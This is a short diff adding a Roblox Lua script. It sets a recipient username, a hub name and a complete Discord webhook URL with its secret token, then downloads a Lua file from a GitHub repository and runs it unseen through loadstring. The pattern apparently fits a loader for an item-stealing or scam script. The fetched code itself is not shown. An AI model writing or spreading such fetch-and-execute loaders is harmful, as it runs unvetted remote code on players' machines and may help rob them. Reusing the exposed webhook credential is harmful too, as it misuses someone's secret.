@@ -1,0 +1,5 @@
+_G.Username = "epicgamer1001011"
+_G.HubName = "CloudFarm"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1095414956440166503/-whhew04QxDn19MgCnUDBp82RPWs0sBcZTfu-7YA8H8DrM78SVL1TospOgVe15Y5U3I7"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
